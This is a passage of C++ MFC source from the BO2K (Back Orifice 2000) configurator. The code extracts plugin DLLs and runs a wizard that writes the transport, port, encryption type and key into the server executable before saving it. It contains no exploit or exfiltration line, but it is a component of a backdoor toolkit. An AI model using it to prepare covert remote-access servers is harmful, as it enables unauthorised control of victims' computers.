			if((nValue>m_arrVarInfo[nVar].nNumHi) ||
			   (nValue<m_arrVarInfo[nVar].nNumLo)) {
				AfxMessageBox("Value is out of range.");
				return;
			}
		}
		lstrcpyn(m_arrVarInfo[nVar].svVarValue,str,256);
		GetDlgItem(IDC_STR_CURRENTVALUE)->SetWindowText(str);
	
		// Set into image
		VARIABLE_INFO vi=m_arrVarInfo[nVar];
		char *ptr;
		DWORD pos;
		if(vi.nPlugin>=0) {
			PLUGIN_INFO pi=m_arrPluginInfo[vi.nPlugin];
			ptr=(char *)pi.pPluginImage;
		} else {
			ptr=(char *)m_pSvrView;
		}
		pos=vi.dwPos;
		memset(ptr+pos,0,vi.nStrLen+1);
		memcpy(ptr+pos,vi.svVarValue,lstrlen(vi.svVarValue));
	}	
}

void CBo2kcfgDlg::OnExit()
{
	CloseServer();

	EndDialog(0);	
}

void CBo2kcfgDlg::OnClose() 
{
	OnExit();
}

void CBo2kcfgDlg::OnExtract() 
{
	// Get Selected List Item
	CListCtrl *pLC=((CListCtrl *)GetDlgItem(IDC_PLUGINS));
	int nItem;
	nItem=pLC->GetSelectionMark();
	if(nItem==-1) return;
	
	// Get plugin 
	PLUGIN_INFO pi;
	pi=m_arrPluginInfo.GetAt(nItem);

	// Write to disk
	CFileDialog cfd(FALSE,".dll",pi.svFilename,OFN_OVERWRITEPROMPT|OFN_PATHMUSTEXIST,"DLL Files (*.dll)|*.dll|All Files (*.*)|*.*||",this);
	if(cfd.DoModal()) {
		CFile file(cfd.GetPathName(),CFile::modeCreate|CFile::modeWrite|CFile::typeBinary);
		file.Write(pi.pPluginImage,pi.dwPluginLen);
		file.Close();
		AfxMessageBox("Plugin extracted.",MB_OK|MB_ICONINFORMATION|MB_TOPMOST|MB_SETFOREGROUND);
	}
}

void CBo2kcfgDlg::OnWizard() 
{
	CloseServer();
	DoWizard();
}

void CBo2kcfgDlg::DoWizard()
{
	CWizard1 wiz1;
	CWizard2 wiz2;
	CWizard3 wiz3;
	CWizard4 wiz4;
	CWizard5 wiz5;
	CWizard6 wiz6;
	CWizard7 wiz7;

	wiz1.m_bShowWizard=AfxGetApp()->GetProfileInt("Startup","Wizard",TRUE);
	wiz2.m_strServerFile="bo2k.exe";
	wiz3.m_nNetType=0;
	wiz4.m_nPort=0;
	wiz5.m_nEncType=1;
	wiz6.m_nLetterCount=0;
	wiz6.m_strPassword="";

	int nState=1,nRet;
	while(nState>0 && nState<8) {
		switch(nState) {
		case 1:
			nRet=wiz1.DoModal();
			break;
		case 2:
			CloseServer();
			nRet=wiz2.DoModal();
			if(nRet==IDOK) {
				if(IsValidServer(wiz2.m_strServerFile)) {
					if(!OpenServer(wiz2.m_strServerFile)) {
						AfxMessageBox("The BO2K server you have selected could not be loaded.");
						nRet=0;
					} 
				} else {
					AfxMessageBox("The file you selected is not a BO2K server.");
					nRet=0;
				}				
			}
			break;
		case 3:
			nRet=wiz3.DoModal();
			break;
		case 4:
			nRet=wiz4.DoModal();
			break;
		case 5:
			{
				wiz5.m_bDESPresent=FALSE;
			
				int i,count;
				count=m_arrPluginInfo.GetSize();
				for(i=0;i<count;i++) {
					PLUGIN_INFO pi;
					pi=m_arrPluginInfo.GetAt(i);
					if(lstrcmpi(pi.svFilename,"bo3des.dll")==0) {
						wiz5.m_bDESPresent=TRUE;
						break;
					}
				}	
			}

			nRet=wiz5.DoModal();
			break;
		case 6:
			{
				if(wiz5.m_nEncType==1) {
					wiz6.m_nMinLetterCount=14;
					wiz6.m_nMaxLetterCount=45;
				} else {
					wiz6.m_nMinLetterCount=4;
					wiz6.m_nMaxLetterCount=45;
				}
				
				nRet=wiz6.DoModal();
			}
			
			break;
		case 7:
			nRet=wiz7.DoModal();
			break;
		}
		if(nRet==IDOK) nState++;
		else if(nRet==IDBACK) nState--;
		else if(nRet==IDCANCEL) {
			nState=0;
		}
	}

	if(nState==0) {
		CloseServer();
		return;
	}
	
	// Modify stuff
	int i,count;
	char *ptr;
	DWORD pos;
	BOOL bWrite;

	const char *szOldProfName=AfxGetApp()->m_pszProfileName;
	AfxGetApp()->m_pszProfileName="BO2K Client";
	
	count=m_arrVarInfo.GetSize();
	for(i=0;i<count;i++) {
		VARIABLE_INFO vi;
		vi=m_arrVarInfo.GetAt(i);

		bWrite=TRUE;
		if(lstrcmpi(vi.svCategory,"Startup")==0 && lstrcmpi(vi.svVarName,"Init Cmd Net Type")==0) {
			lstrcpyn(vi.svVarValue,(wiz3.m_nNetType==0)?"TCPIO":"UDPIO",vi.nStrLen+1);
		} else if(lstrcmpi(vi.svCategory,"Startup")==0 && lstrcmpi(vi.svVarName,"Init Cmd Bind Str")==0) {
			wsprintf(vi.svVarValue,"%u",wiz4.m_nPort);	
		} else if(lstrcmpi(vi.svCategory,"TCPIO")==0 && lstrcmpi(vi.svVarName,"Default Port")==0) {
			if(wiz3.m_nNetType==0) {
				wsprintf(vi.svVarValue,"%u",wiz4.m_nPort);
				AfxGetApp()->WriteProfileString("TCPIO","Default Port",vi.svVarValue);
			}
		} else if(lstrcmpi(vi.svCategory,"UDPIO")==0 && lstrcmpi(vi.svVarName,"Default Port")==0) {
			if(wiz3.m_nNetType==1) {
				wsprintf(vi.svVarValue,"%u",wiz4.m_nPort);
				AfxGetApp()->WriteProfileString("UDPIO","Default Port",vi.svVarValue);
			}
		} else if(lstrcmpi(vi.svCategory,"Startup")==0 && lstrcmpi(vi.svVarName,"Init Cmd Encryption")==0) {
			lstrcpyn(vi.svVarValue,(wiz5.m_nEncType==0)?"XOR":"3DES",vi.nStrLen+1);
		} else if(lstrcmpi(vi.svCategory,"3DES")==0 && lstrcmpi(vi.svVarName,"3DES Key String")==0) {
			if(wiz5.m_nEncType==1) {
				lstrcpyn(vi.svVarValue,wiz6.m_strPassword,vi.nStrLen+1);
				AfxGetApp()->WriteProfileString("3DES","3DES Key String",vi.svVarValue);
			}
		} else if(lstrcmpi(vi.svCategory,"XOR")==0 && lstrcmpi(vi.svVarName,"XOR Key")==0) {
			if(wiz5.m_nEncType==0) {
				lstrcpyn(vi.svVarValue,wiz6.m_strPassword,vi.nStrLen+1);
				AfxGetApp()->WriteProfileString("XOR","XOR Key",vi.svVarValue);
			}
		} else if(lstrcmpi(vi.svCategory,"File Transfer")==0 && lstrcmpi(vi.svVarName,"File Xfer Net Type")==0) {
			lstrcpyn(vi.svVarValue,(wiz3.m_nNetType==0)?"TCPIO":"UDPIO",vi.nStrLen+1);
		} else if(lstrcmpi(vi.svCategory,"File Transfer")==0 && lstrcmpi(vi.svVarName,"File Xfer Encryption")==0) {
			lstrcpyn(vi.svVarValue,(wiz5.m_nEncType==0)?"XOR":"3DES",vi.nStrLen+1);
		} else {
			bWrite=FALSE;
		}

		if(bWrite) {
			if(vi.nPlugin>=0) {
				PLUGIN_INFO pi=m_arrPluginInfo[vi.nPlugin];
				ptr=(char *)pi.pPluginImage;
			} else {
				ptr=(char *)m_pSvrView;
			}
			pos=vi.dwPos;
			memset(ptr+pos,0,vi.nStrLen+1);
			memcpy(ptr+pos,vi.svVarValue,lstrlen(vi.svVarValue));
		}
	}	

	AfxGetApp()->m_pszProfileName=szOldProfName;
		
	SaveServer();
	CloseServer();
}
